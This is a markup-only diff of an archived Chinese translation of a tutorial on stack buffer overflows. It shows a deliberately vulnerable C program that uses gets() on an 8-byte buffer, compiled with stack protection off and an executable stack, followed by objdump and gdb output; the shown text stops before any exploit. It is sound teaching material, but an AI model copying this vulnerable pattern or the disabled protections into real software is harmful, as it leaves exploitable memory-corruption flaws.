@@ -3,17 +3,17 @@
 			<head>
 			     <title>做个试验：简单的缓冲区溢出 - blast</title>
 				 <meta http-equiv="content-type" content="text/html; charset=UTF-8">
-			</head>
+			<link rel="stylesheet" type="text/css" href="../stylesheets/stylesheet.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/github-dark.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/print.css" media="print"><style type="text/css">body {width: 90%;max-width: 960px;display: block;margin: 0 auto;}img {max-width: 900px;}</style></head>
 			<body>
 				<h1>原文地址:<a href="http://drops.wooyun.org/papers/1421">http://drops.wooyun.org/papers/1421</a></h1>
 				
       <p>
-        <p>from：<a href="http://www.spectrumcoding.com/tutorials/exploits/2013/05/27/buffer-overflows.html">http://www.spectrumcoding.com/tutorials/exploits/2013/05/27/buffer-overflows.html</a>
+        </p><p>from：<a href="http://www.spectrumcoding.com/tutorials/exploits/2013/05/27/buffer-overflows.html">http://www.spectrumcoding.com/tutorials/exploits/2013/05/27/buffer-overflows.html</a>
 翻译的比较逗比，都是按照原文翻译的，加了少量润色。中间有卡住的地方或者作者表述不清楚的地方我都加了注，大家将就看吧=v=。</p>
 
 <h2>0x00 背景</h2>
 
-<hr />
+<hr>
 
 <p>我不是一个专职做安全的人（注：作者是全栈攻城狮-v-），但是我最近读了点东西，觉得它很有意思。</p>
 
@@ -29,7 +29,7 @@
 
 <h2>0x01 细节</h2>
 
-<hr />
+<hr>
 
 <p>那么，干正事儿了。首先，你应该知道什么是栈了，如果不知道的话赶紧去<a href="http://wiki.osdev.org/Stack">http://wiki.osdev.org/Stack</a>看看。简单来说它就是一个后进先出的结构，从高地址增长向低地址。我将通过下面的有问题的程序来解释一下这个问题。</p>
 
@@ -68,14 +68,14 @@ int main()
 <p>代码很简单，用户输入一个密码，然后程序把它加密起来，并且和程序中存储的密码对比，如果成功了，就调用<code>authorized()</code>函数，你们就当这个<code>authorized()</code>函数是用来让用户在登录后干一些敏感操作的好了（虽然这个例子里面我们只打印了一串字符串）。那么，我们编译一下，看看结果。</p>
 
 <pre><code>#!bash
-<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="f093829983b0838095938482859d9984dd93829983">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script> ~/D/p/overflow&gt; gcc -ggdb -fno-stack-protector -z execstack overflow.c -lcrypt -o overflow
+<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="f093829983b0838095938482859d9984dd93829983">[email&#160;protected]</a><script data-cfhash="f9e31" type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script> ~/D/p/overflow&gt; gcc -ggdb -fno-stack-protector -z execstack overflow.c -lcrypt -o overflow
 overflow.c: In function 'getInput':
 overflow.c:12:2: warning: 'gets' is deprecated (declared at /usr/include/stdio.h:638) [-Wdeprecated-declarations]
   gets(buffer);
   ^
-<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="afccddc6dcefdcdfcaccdbdddac2c6db82ccddc6dc">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script> ~/D/p/overflow&gt; ./overflow
+<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="afccddc6dcefdcdfcaccdbdddac2c6db82ccddc6dc">[email&#160;protected]</a><script data-cfhash="f9e31" type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script> ~/D/p/overflow&gt; ./overflow
 password
-<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="fe9d8c978dbe8d8e9b9d8a8c8b93978ad39d8c978d">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script> ~/D/p/overflow&gt;
+<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="fe9d8c978dbe8d8e9b9d8a8c8b93978ad39d8c978d">[email&#160;protected]</a><script data-cfhash="f9e31" type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script> ~/D/p/overflow&gt;
 </code></pre>
 
 <p>程序分配8字节的缓冲区，然后把用户输入存储到这个缓冲区里面，然后调用函数把它加密，再和程序里的密码对比。</p>
@@ -85,7 +85,7 @@ password
 <p>我们用objdump来dump一下生成的机器码，看看这儿它做了什么：</p>
 
 <pre><code>#!bash
-<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="d3b0a1baa093a0a3b6b0a7a1a6bebaa7feb0a1baa0">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script> ~/D/p/overflow&gt; objdump -d -M intel blog
+<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="d3b0a1baa093a0a3b6b0a7a1a6bebaa7feb0a1baa0">[email&#160;protected]</a><script data-cfhash="f9e31" type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script> ~/D/p/overflow&gt; objdump -d -M intel blog
 </code></pre>
 
 <p><br></p>
@@ -104,7 +104,7 @@ Disassembly of section .text:
   4006a0: 55                    push   rbp
   4006a1: 48 89 e5              mov    rbp,rsp
   4006a4: bf e2 07 40 00        mov    edi,0x4007e2
-  4006a9: e8 a2 fe ff ff        call   400550 &lt;<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="176762636457677b63">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>&gt;
+  4006a9: e8 a2 fe ff ff        call   400550 &lt;<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="176762636457677b63">[email&#160;protected]</a><script data-cfhash="f9e31" type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>&gt;
   4006ae: 5d                    pop    rbp
   4006af: c3                    ret
 
@@ -114,14 +114,14 @@ Disassembly of section .text:
   4006b4: 48 83 ec 10           sub    rsp,0x10
   4006b8: 48 8d 45 f0           lea    rax,[rbp-0x10]
   4006bc: 48 89 c7              mov    rdi,rax
-  4006bf: e8 dc fe ff ff        call   4005a0 &lt;<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="482f2d3c3b0838243c">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>&gt;
+  4006bf: e8 dc fe ff ff        call   4005a0 &lt;<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="482f2d3c3b0838243c">[email&#160;protected]</a><script data-cfhash="f9e31" type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>&gt;
   4006c4: 48 8d 45 f0           lea    rax,[rbp-0x10]
   4006c8: be f2 07 40 00        mov    esi,0x4007f2
   4006cd: 48 89 c7              mov    rdi,rax
-  4006d0: e8 8b fe ff ff        call   400560 &lt;<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="6b0819121b1f2b1b071f">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>&gt;
+  4006d0: e8 8b fe ff ff        call   400560 &lt;<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="6b0819121b1f2b1b071f">[email&#160;protected]</a><script data-cfhash="f9e31" type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>&gt;
   4006d5: 48 89 c6              mov    rsi,rax
   4006d8: bf c0 07 40 00        mov    edi,0x4007c0
-  4006dd: e8 9e fe ff ff        call   400580 &lt;<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="86f5f2f4e5ebf6c6f6eaf2">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>&gt;
+  4006dd: e8 9e fe ff ff        call   400580 &lt;<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="86f5f2f4e5ebf6c6f6eaf2">[email&#160;protected]</a><script data-cfhash="f9e31" type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>&gt;
   4006e2: 85 c0                 test   eax,eax
   4006e4: 75 0a                 jne    4006f0 &lt;getInput+0x40&gt;
   4006e6: b8 00 00 00 00        mov    eax,0x0
@@ -175,7 +175,7 @@ Disassembly of section .text:
 
 <p>栈帧是一个函数调用在栈上使用的一片内存，它包含有参数（注：64位下如果系统决定用寄存器传参，那参数这东西也有可能没有）、返回地址和本地变量。我从wikipedia的文章里面偷来一张图，大家可以看看：<a href="http://en.wikipedia.org/wiki/Call_stack">http://en.wikipedia.org/wiki/Call_stack</a></p>
 
-<p><img src="http://static.wooyun.org/20140918/2014091811183284311.png" alt="enter image description here" /></p>
+<p><img src="http://static.wooyun.org/20140918/2014091811183284311.png" alt="enter image description here"></p>
 
 <p>函数名虽然各不相同，但是状况是一样的，栈向下增长，所以一个函数的返回地址在相对于本地变量里更高的位置。我们回到之前的函数看看这对我们来说意味着啥。在函数初始化阶段之后，有一个<code>mov eax，0x0</code>的语句，那之后会调用了我们的<code>getInput()</code>函数。</p>
 
@@ -186,14 +186,14 @@ Disassembly of section .text:
   4006b4: 48 83 ec 10           sub    rsp,0x10
   4006b8: 48 8d 45 f0           lea    rax,[rbp-0x10]
   4006bc: 48 89 c7              mov    rdi,rax
-  4006bf: e8 dc fe ff ff        call   4005a0 &lt;<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="a6c1c3d2d5e6d6cad2">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>&gt;
+  4006bf: e8 dc fe ff ff        call   4005a0 &lt;<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="a6c1c3d2d5e6d6cad2">[email&#160;protected]</a><script data-cfhash="f9e31" type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>&gt;
   4006c4: 48 8d 45 f0           lea    rax,[rbp-0x10]
   4006c8: be f2 07 40 00        mov    esi,0x4007f2
   4006cd: 48 89 c7              mov    rdi,rax
-  4006d0: e8 8b fe ff ff        call   400560 &lt;<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="ef8c9d969f9baf9f839b">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>&gt;
+  4006d0: e8 8b fe ff ff        call   400560 &lt;<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="ef8c9d969f9baf9f839b">[email&#160;protected]</a><script data-cfhash="f9e31" type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>&gt;
   4006d5: 48 89 c6              mov    rsi,rax
   4006d8: bf c0 07 40 00        mov    edi,0x4007c0
-  4006dd: e8 9e fe ff ff        call   400580 &lt;<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="21525553424c5161514d55">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>&gt;
+  4006dd: e8 9e fe ff ff        call   400580 &lt;<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="21525553424c5161514d55">[email&#160;protected]</a><script data-cfhash="f9e31" type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>&gt;
   4006e2: 85 c0                 test   eax,eax
   4006e4: 75 0a                 jne    4006f0 &lt;getInput+0x40&gt;
   4006e6: b8 00 00 00 00        mov    eax,0x0
@@ -225,7 +225,7 @@ void getInput() {
 <p>当call指令执行的时候，rip（指令寄存器）将会被压到栈上。这也就是为啥栈会在push rbp之后对齐到16字节的原因：返回地址只有8个字节长，rbp只好用另外8个字节来对齐了。让我们在gdb里面加载一下我们的程序，跟一下看看栈上发生了啥：</p>
 
 <pre><code>#!bash
-<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="83e0f1eaf0c3f0f3e6e0f7f1f6eeeaf7aee0f1eaf0">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script> ~/D/p/overflow&gt; gdb overflow
+<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="83e0f1eaf0c3f0f3e6e0f7f1f6eeeaf7aee0f1eaf0">[email&#160;protected]</a><script data-cfhash="f9e31" type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script> ~/D/p/overflow&gt; gdb overflow
 GNU gdb (GDB) 7.6
 Copyright (C) 2013 Free Software Foundation, Inc.
 License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;
@@ -295,14 +295,14 @@ Dump of assembler code for function getInput:
   0x00000000004006b4 &lt;+4&gt;:  sub    rsp,0x10
   0x00000000004006b8 &lt;+8&gt;:  lea    rax,[rbp-0x10]
   0x00000000004006bc &lt;+12&gt;: mov    rdi,rax
-  0x00000000004006bf &lt;+15&gt;: call   0x4005a0 &lt;<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="b0d7d5c4c3f0c0dcc4">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>&gt;
+  0x00000000004006bf &lt;+15&gt;: call   0x4005a0 &lt;<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="b0d7d5c4c3f0c0dcc4">[email&#160;protected]</a><script data-cfhash="f9e31" type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>&gt;
   0x00000000004006c4 &lt;+20&gt;: lea    rax,[rbp-0x10]
   0x00000000004006c8 &lt;+24&gt;: mov    esi,0x4007f2
   0x00000000004006cd &lt;+29&gt;: mov    rdi,rax
-  0x00000000004006d0 &lt;+32&gt;: call   0x400560 &lt;<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="6d0e1f141d192d1d0119">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>&gt;
+  0x00000000004006d0 &lt;+32&gt;: call   0x400560 &lt;<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="6d0e1f141d192d1d0119">[email&#160;protected]</a><script data-cfhash="f9e31" type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>&gt;
   0x00000000004006d5 &lt;+37&gt;: mov    rsi,rax
   0x00000000004006d8 &lt;+40&gt;: mov    edi,0x4007c0
-  0x00000000004006dd &lt;+45&gt;: call   0x400580 &lt;<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="4a393e3829273a0a3a263e">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>&gt;
